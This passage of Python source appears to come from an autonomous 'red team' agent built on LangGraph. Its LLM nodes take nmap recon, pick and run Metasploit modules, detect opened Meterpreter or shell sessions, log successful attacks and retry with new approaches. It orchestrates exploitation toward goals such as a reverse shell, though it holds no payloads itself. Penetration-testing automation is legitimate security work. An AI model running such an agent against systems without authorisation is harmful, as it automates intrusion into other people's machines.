    # Scan recent tool outputs for Metasploit session-opened indicators
    session_detected = False
    for msg in messages[-10:]:
        if isinstance(msg, ToolMessage) and msg.content:
            if re.search(r"(session \d+ opened|Meterpreter session \d+ opened)", msg.content):
                session_detected = True
                break

    evidence = (
        f"EXECUTION RESULT:\n{execution_result}\n\n"
        f"SESSION DETECTED: {session_detected}\n\n"
        f"RECENT TOOL OUTPUTS:\n{'---'.join(tool_outputs)}\n\n"
        f"USER GOAL: {messages[0].content[:500]}\n\n"
        f"LOOP STEP: {current_step} of {MAX_RETRIES}\n"
        f"TOTAL CONTEXT SIZE: {total_chars} chars\n"
    )

    # Compress individual large tool messages before sending to critic
    # (instead of auto-triggering FAIL_CONTEXT which provides no useful guidance)
    if total_chars > TOKEN_SENSITIVE_THRESHOLD:
        print_colored(f"[Critic] Large context ({total_chars} chars) — trimming evidence for critic.", Colors.WARNING)
        # Trim tool outputs to keep evidence manageable
        tool_outputs = [t[-400:] for t in tool_outputs]
        evidence = (
            f"EXECUTION RESULT:\n{execution_result}\n\n"
            f"SESSION DETECTED: {session_detected}\n\n"
            f"RECENT TOOL OUTPUTS (trimmed):\n{'---'.join(tool_outputs)}\n\n"
            f"USER GOAL: {messages[0].content[:500]}\n\n"
            f"LOOP STEP: {current_step} of {MAX_RETRIES}\n"
            f"TOTAL CONTEXT SIZE: {total_chars} chars (large — consider FAIL_CONTEXT if agent is looping)\n"
        )

    response = call_llm(
        messages=[HumanMessage(content=evidence)],
        system_prompt=CRITIC_PROMPT
    )
    classification = response.content.strip()

    print_colored(f"[Critic] Verdict: {classification}", Colors.OKCYAN)

    new_step = current_step + 1

    # Extract structured verdict and set in state for routing
    verdict = extract_verdict(classification)
    print_colored(f"[Critic] Classified as: {verdict}", Colors.OKCYAN)

    if verdict == "PASS":
        return {
            "messages": [AIMessage(content=f"[Critic] PASS — {classification}")],
            "execution_result": execution_result,
            "loop_step": new_step,
            "critic_verdict": "PASS"
        }
    else:
        return {
            "messages": [HumanMessage(content=f"CRITIC FEEDBACK: {classification}")],
            "execution_result": execution_result,
            "loop_step": new_step,
            "critic_verdict": verdict
        }


def success_logger_node(state: AgentState) -> dict:
    """Log successful attack details to the dedicated RAG database."""
    from datetime import datetime
    from tools.rag import log_successful_attack

    target_info = state.get("target_info", {})
    tool_candidate = state.get("tool_candidate", {})
    current_plan = state.get("current_plan", "")
    execution_result = state.get("execution_result", "")

    target_ip = target_info.get("ip", "unknown")
    target_os = target_info.get("os", "unknown")

    # Match attacked service from plan text against target_info ports
    ports = target_info.get("ports", [])
    attacked_port, attacked_service, attacked_version = "", "", ""
    for p in ports:
        svc = p.get("service", "")
        if svc and svc.lower() in current_plan.lower():
            attacked_port = str(p.get("port", ""))
            attacked_service = svc
            attacked_version = p.get("version", "")
            break
    if not attacked_service and ports:  # fallback: first port
        attacked_port = str(ports[0].get("port", ""))
        attacked_service = ports[0].get("service", "")
        attacked_version = ports[0].get("version", "")

    module = tool_candidate.get("module", "unknown")
    description = tool_candidate.get("description", "")

    session_match = re.search(
        r"((?:Command shell|Meterpreter) session \d+ opened)", execution_result
    )
    outcome = session_match.group(1) if session_match else "Session opened"

    log_entry = (
        f"SUCCESSFUL ATTACK LOG\n"
        f"=====================\n"
        f"Target: {target_ip}\n"
        f"OS: {target_os}\n"
        f"Service: {attacked_service}\n"
        f"Version: {attacked_version}\n"
        f"Port: {attacked_port}\n\n"
        f"MSF Module: {module}\n"
        f"Description: {description}\n\n"
        f"Attack Plan: {current_plan}\n\n"
        f"Outcome: {outcome}\n"
        f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M')}\n"
    )

    print_colored(f"\n[Success Logger] Logging to successful_attacks DB...", Colors.OKGREEN)
    result = log_successful_attack(
        content=log_entry,
        metadata={"target_ip": target_ip, "target_os": target_os,
                  "service": attacked_service, "version": attacked_version,
                  "module": module}
    )
    print_colored(f"[Success Logger] {result}", Colors.OKGREEN)

    return {"messages": [AIMessage(content=f"[Success Logger] Attack logged. {outcome}")]}


def _extract_findings(state: dict) -> ExploitationFindings:
    """Extract structured ExploitationFindings from final graph state."""
    target_info = state.get("target_info", {})
    tool_candidate = state.get("tool_candidate", {})
    current_plan = state.get("current_plan", "")
    execution_result = state.get("execution_result", "")
    critic_verdict = state.get("critic_verdict", "")
    messages = state.get("messages", [])

    success = critic_verdict == "PASS"

    # --- session_id and session_type from message history ---
    session_id = ""
    session_type = ""
    # Scan all messages (tool outputs) for session-opened indicators
    for msg in reversed(messages):
        content = msg.content if hasattr(msg, "content") and msg.content else ""
        match = re.search(
            r"(Command shell|Meterpreter) session (\d+) opened", content
        )
        if match:
            raw_type = match.group(1)
            session_id = match.group(2)
            session_type = "meterpreter" if "Meterpreter" in raw_type else "command_shell"
            break

    # --- target_ip ---
    target_ip = target_info.get("ip", "unknown")

    # --- target_port: match service name from plan against target_info ports ---
    ports = target_info.get("ports", [])
    target_port = ""
    for p in ports:
        svc = p.get("service", "")
        if svc and svc.lower() in current_plan.lower():
            target_port = str(p.get("port", ""))
            break
    if not target_port and ports:
        target_port = str(ports[0].get("port", ""))

    # --- exploit_used ---
    approach = tool_candidate.get("approach", "msf")
    module = tool_candidate.get("module")
    if approach == "manual":
        desc = tool_candidate.get("description", "manual exploitation")
        exploit_used = f"manual:{desc}"
    elif module:
        exploit_used = module
    else:
        exploit_used = "unknown"

    # --- access_level: infer from execution_result ---
    access_level = "unknown"
    result_lower = (execution_result or "").lower()
    if "root" in result_lower or "uid=0" in result_lower:
        access_level = "root"
    elif session_id:
        access_level = "user"

    # --- summary ---
    if success and session_id:
        summary = f"{session_type} session {session_id} opened on {target_ip}:{target_port} via {exploit_used}"
    elif success:
        summary = f"Attack succeeded on {target_ip} via {exploit_used}"
    else:
        # Pull last critic feedback for failure context
        fail_summary = ""
        for msg in reversed(messages):
            content = msg.content if hasattr(msg, "content") and msg.content else ""
            if "CRITIC FEEDBACK" in content:
                fail_summary = content[:200]
                break
        summary = f"Attack failed on {target_ip}. {fail_summary}".strip()

    return ExploitationFindings(
        success=success,
        session_id=session_id,
        session_type=session_type,
        target_ip=target_ip,
        target_port=target_port,
        exploit_used=exploit_used,
        access_level=access_level,
        summary=summary,
    )


def summarizer_node(state: AgentState) -> dict:
    """Compress message history while preserving key technical details."""
    messages = state['messages']

    print_colored("\n[Summarizer] Compressing context...", Colors.HEADER)

    # Keep original user message
    original_msg = messages[0]

    # Keep last 2 turns (approximate: last 6 messages)
    tail_count = min(6, len(messages) - 1)
    tail = messages[-tail_count:] if tail_count > 0 else []

    # Summarize everything in between
    middle = messages[1:-tail_count] if tail_count > 0 else messages[1:]

    if middle:
        summary = summarize_history(middle)
        summary_msg = HumanMessage(content=f"[COMPRESSED HISTORY]\n{summary}")
        new_messages = [original_msg, summary_msg] + tail
    else:
        new_messages = [original_msg] + tail

    # Also compress any individually large messages in the tail
    final_messages = []
    for msg in new_messages:
        if msg.content and len(msg.content) > HEAVY_MESSAGE_THRESHOLD:
            final_messages.append(compress_large_message(msg))
        else:
            final_messages.append(msg)

    print_colored(f"[Summarizer] Compressed {len(messages)} messages → {len(final_messages)} messages", Colors.OKGREEN)

    # We need to REPLACE the entire message list, not append.
    # LangGraph uses operator.add for messages, so we clear by returning the diff.
    # Workaround: return the summarized content as a single new message since we can't
    # replace the full list via operator.add. The summarizer injects compressed context.
    summary_text = summarize_history(messages[1:])
    return {
        "messages": [HumanMessage(content=f"[COMPRESSED HISTORY — Previous attempts summarized]\n{summary_text}\n\nRetry with a completely different approach.")]
    }

# =============================================================================
# ROUTING FUNCTIONS
# =============================================================================

def route_after_researcher(state: AgentState) -> Literal["researcher_tools", "planner"]:
    """Route researcher output: tool call → tools node, text → planner."""
    last_msg = state['messages'][-1]

    if hasattr(last_msg, 'tool_calls') and last_msg.tool_calls:
        # Count researcher tool calls as extra safety
        count = 0
        for msg in reversed(state['messages']):
            if _is_cycle_boundary(msg):
                break
            if isinstance(msg, ToolMessage):
                count += 1
        if count >= MAX_RESEARCHER_TOOL_CALLS:
            return "planner"  # Force exit loop
        return "researcher_tools"
    return "planner"


def route_after_executor(state: AgentState) -> Literal["executor_tools", "critic"]:
    """Route executor output: tool call → tools node, text → critic."""
    last_msg = state['messages'][-1]

    if hasattr(last_msg, 'tool_calls') and last_msg.tool_calls:
        # Check safety valve
        executor_tool_count = 0
        for msg in reversed(state['messages']):
            if isinstance(msg, AIMessage) and "[Parameter Solver]" in (msg.content or ""):
                break
            if isinstance(msg, ToolMessage):
                executor_tool_count += 1

        if executor_tool_count >= MAX_EXECUTOR_TOOL_CALLS:
            return "critic"

        return "executor_tools"
    return "critic"


def route_after_critic(state: AgentState) -> Literal["parameter_solver", "researcher", "summarizer", "success_logger", "__end__"]:
    """Route based on critic's structured verdict in state."""
    time.sleep(3)  # Rate limiting

    current_step = state.get("loop_step", 0)
    if current_step >= MAX_RETRIES:
        print_colored("--- MAX RETRIES REACHED ---", Colors.FAIL)
        return END

    verdict = state.get("critic_verdict", "FAIL_EXPLOIT")

    if verdict == "PASS":
        return "success_logger"
    elif verdict == "FAIL_PARAM":
        return "parameter_solver"
    elif verdict == "FAIL_EXPLOIT":
        return "researcher"
    elif verdict == "FAIL_CONTEXT":
        return "summarizer"
    else:
        return "researcher"  # Safe default

# =============================================================================
# GRAPH CONSTRUCTION
# =============================================================================

def build_graph() -> StateGraph:
    """Construct the multi-node agent workflow graph."""
    workflow = StateGraph(AgentState)

    # Add nodes (no researcher_filter)
    workflow.add_node("recon_parser", recon_parser_node)
    workflow.add_node("researcher", researcher_node)
    workflow.add_node("researcher_tools", researcher_tools_node, retry=RetryPolicy(max_attempts=2))
    workflow.add_node("planner", planner_node)
    workflow.add_node("parameter_solver", parameter_solver_node)
    workflow.add_node("executor", executor_node)
    workflow.add_node("executor_tools", executor_tools_node, retry=RetryPolicy(max_attempts=2))
    workflow.add_node("critic", critic_node)
    workflow.add_node("success_logger", success_logger_node)
    workflow.add_node("summarizer", summarizer_node)

    # Entry point
    workflow.set_entry_point("recon_parser")

    # Linear: recon → researcher
    workflow.add_edge("recon_parser", "researcher")

    # Researcher ReAct loop → planner
    workflow.add_conditional_edges(
        "researcher",
        route_after_researcher,
        {"researcher_tools": "researcher_tools", "planner": "planner"}
    )
    workflow.add_edge("researcher_tools", "researcher")

    # Planner → parameter_solver
    workflow.add_edge("planner", "parameter_solver")

    # Parameter solver → executor
    workflow.add_edge("parameter_solver", "executor")

    # Executor ReAct loop
    workflow.add_conditional_edges(
        "executor",
        route_after_executor,
        {"executor_tools": "executor_tools", "critic": "critic"}
    )
    workflow.add_edge("executor_tools", "executor")

    # Critic routing (FAIL_EXPLOIT → researcher instead of planner)
    workflow.add_conditional_edges(
        "critic",
        route_after_critic,
        {
            "parameter_solver": "parameter_solver",
            "researcher": "researcher",
            "summarizer": "summarizer",
            "success_logger": "success_logger",
            END: END
        }
    )

    # Success logger → END
    workflow.add_edge("success_logger", END)

    # Summarizer → researcher (was: planner)
    workflow.add_edge("summarizer", "researcher")

    return workflow

# =============================================================================
# SUBGRAPH WRAPPER
# =============================================================================

def run_exploitation(
    target_info: dict,
    objective: str,
    raw_recon: str = "",
    thread_id: str = None,
    recursion_limit: int = 150,
) -> ExploitationFindings:
    """Run the exploitation graph as a callable subgraph and return structured findings.

    Args:
        target_info: Dict with keys {ip, os, hostname, ports: [{port, state, service, version}]}
        objective: Attack objective string (e.g., "get a reverse shell on the target")
        raw_recon: Optional raw nmap/recon output. If empty, recon_parser_node will
                   skip parsing and preserve the pre-injected target_info.
        thread_id: Optional thread ID for checkpointing. Defaults to a timestamped ID.
        recursion_limit: Max LangGraph recursion steps (default 150).

    Returns:
        ExploitationFindings dict with success, session_id, session_type, etc.
    """
    import uuid

    if thread_id is None:
        thread_id = f"exploit_{uuid.uuid4().hex[:8]}"

    workflow = build_graph()
    checkpointer = MemorySaver()
    app = workflow.compile(checkpointer=checkpointer)

    config = {
        "configurable": {"thread_id": thread_id},
        "recursion_limit": recursion_limit,
    }

    initial_state = {
        "messages": [HumanMessage(content=objective)],
        "raw_recon": raw_recon,
        "target_info": target_info,
        "current_plan": "",
        "tool_candidate": {},
        "execution_result": "",
        "loop_step": 0,
        "critic_verdict": "",
    }

    print_colored(f"\n{'='*60}", Colors.HEADER)
    print_colored(f"[run_exploitation] Starting exploitation subgraph", Colors.HEADER)
    print_colored(f"  Target: {target_info.get('ip', 'unknown')}", Colors.HEADER)
    print_colored(f"  Objective: {objective[:100]}", Colors.HEADER)
    print_colored(f"  Thread: {thread_id}", Colors.HEADER)
    print_colored(f"{'='*60}\n", Colors.HEADER)

    # Stream to completion, printing progress
    for event in app.stream(initial_state, config=config):
        for key, value in event.items():
            if not value or "messages" not in value:
                continue
            messages = value["messages"]
            if not isinstance(messages, list):
                messages = [messages]
            for msg in messages:
                if not isinstance(msg, BaseMessage) or not msg.content:
                    continue
                if "CRITIC FEEDBACK" in msg.content:
                    print_colored(f"\n{msg.content}", Colors.FAIL)
                elif "COMPRESSED HISTORY" in msg.content:
                    print_colored("\n[System] Context compressed for fresh retry.", Colors.OKCYAN)
                elif isinstance(msg, ToolMessage):
                    display = msg.content[:500]
                    if len(msg.content) > 500:
                        display += "... [truncated]"
                    print(f"\n[Tool Output]: {display}")
                elif isinstance(msg, AIMessage):
                    content = msg.content
                    if content.startswith("[Recon Parser]"):
                        print_colored(f"\n{content}", Colors.HEADER)
                    elif content.startswith("[Planner]"):
                        print_colored(f"\n{content}", Colors.OKBLUE)
                    elif content.startswith("[Parameter Solver]"):
                        print_colored(f"\n{content}", Colors.WARNING)
                    elif content.startswith("[Critic]"):
                        color = Colors.OKGREEN if "PASS" in content else Colors.FAIL
                        print_colored(f"\n{content}", color)
                    else:
                        print_colored(f"\nAgent: {content}", Colors.OKGREEN)

    # Extract final state and return structured findings
    final_state_snapshot = app.get_state(config)
    final_state = final_state_snapshot.values

    findings = _extract_findings(final_state)

    print_colored(f"\n{'='*60}", Colors.HEADER)
    print_colored(f"[run_exploitation] Complete — success={findings['success']}", Colors.OKGREEN if findings['success'] else Colors.FAIL)
    print_colored(f"  {findings['summary']}", Colors.OKCYAN)
    print_colored(f"{'='*60}\n", Colors.HEADER)

    return findings

# =============================================================================
# MAIN
# =============================================================================

def main():
    """Run the interactive agent REPL."""

    # Handle --graph flag for visualization
    if "--graph" in sys.argv:
        workflow = build_graph()
        app = workflow.compile()
        try:
            print(app.get_graph().draw_ascii())
        except Exception:
            # Fallback: print node and edge info
            graph = app.get_graph()
            print("Nodes:", [n for n in graph.nodes])
            print("Edges:", [(e.source, e.target) for e in graph.edges])
        return

    workflow = build_graph()
    checkpointer = MemorySaver()
    app = workflow.compile(checkpointer=checkpointer)

    print_colored(f"--- Red Team Multi-Node Agent ({MODEL_NAME}) ---", Colors.OKGREEN)
    print_colored("Nodes: recon_parser → researcher → planner → param_solver → executor → critic", Colors.OKCYAN)

    config = {
        "configurable": {"thread_id": "session_multinode_1"},
        "recursion_limit": 150
    }

    try:
        while True:
            user_input = input("\n[User]: ")
            if user_input.lower() in ["quit", "exit"]:
                break

            # Parse input type: "recon: <nmap output>" vs plain attack objective
            if user_input.lower().startswith("recon:"):
                raw_recon = user_input[6:].strip()
                msg_content = raw_recon
            else:
                raw_recon = ""
                msg_content = user_input

            initial_state = {
                "messages": [HumanMessage(content=msg_content)],
                "raw_recon": raw_recon,
                "current_plan": "",
                "tool_candidate": {},
                "execution_result": "",
                "loop_step": 0,
            }
            # Only reset target_info when providing new recon data;
            # on plain objectives, the checkpointer preserves target_info
            # from the prior recon run on the same thread.
            if raw_recon:
                initial_state["target_info"] = {}

            for event in app.stream(initial_state, config=config):
                for key, value in event.items():
                    if not value or "messages" not in value:
                        continue

                    messages = value["messages"]
                    if not isinstance(messages, list):
                        messages = [messages]

                    for msg in messages:
                        if not isinstance(msg, BaseMessage) or not msg.content:
                            continue

                        # Skip internal feedback messages in console output
                        if "CRITIC FEEDBACK" in msg.content:
                            print_colored(f"\n{msg.content}", Colors.FAIL)
                            continue
                        if "COMPRESSED HISTORY" in msg.content:
                            print_colored("\n[System] Context compressed for fresh retry.", Colors.OKCYAN)
                            continue

                        # Print based on message type and node
                        if isinstance(msg, ToolMessage):
                            # Truncate long tool output for console
                            display = msg.content[:500]
                            if len(msg.content) > 500:
                                display += "... [truncated]"
                            print(f"\n[Tool Output]: {display}")
                        elif isinstance(msg, AIMessage):
                            # Color-code by node
                            content = msg.content
                            if content.startswith("[Recon Parser]"):
                                print_colored(f"\n{content}", Colors.HEADER)
                            elif content.startswith("[Planner]"):
                                print_colored(f"\n{content}", Colors.OKBLUE)
                            elif content.startswith("[Parameter Solver]"):
                                print_colored(f"\n{content}", Colors.WARNING)
                            elif content.startswith("[Critic]"):
                                if "PASS" in content:
                                    print_colored(f"\n{content}", Colors.OKGREEN)
                                else:
                                    print_colored(f"\n{content}", Colors.FAIL)
                            else:
                                print_colored(f"\nAgent: {content}", Colors.OKGREEN)

                        # Show tool calls being made
                        if hasattr(msg, "tool_calls") and msg.tool_calls:
                            for t in msg.tool_calls:
                                print_colored(
                                    f"   (Calling Tool: {t['name']} args: {str(t['args'])[:200]}...)",
                                    Colors.OKCYAN
                                )

    except KeyboardInterrupt:
        print_colored("\nProgram interrupted by user", Colors.FAIL)
    finally:
        msf_session.cleanup()


if __name__ == "__main__":
    main()
